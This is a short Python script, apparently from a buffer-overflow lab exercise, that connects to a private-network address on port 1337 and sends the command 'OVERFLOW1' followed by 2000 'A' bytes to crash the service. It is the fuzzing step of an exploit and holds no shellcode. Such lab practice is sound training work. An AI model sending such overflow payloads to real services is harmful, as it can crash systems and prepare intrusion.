#!/usr/bin/python3
import socket

host, port = "10.10.61.109", 1337

cmd = b"OVERFLOW1 "

payload = b"".join([
            cmd,
            b"A" * 2000,
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)
    #s.recv(4096).decode("utf-8").strip()

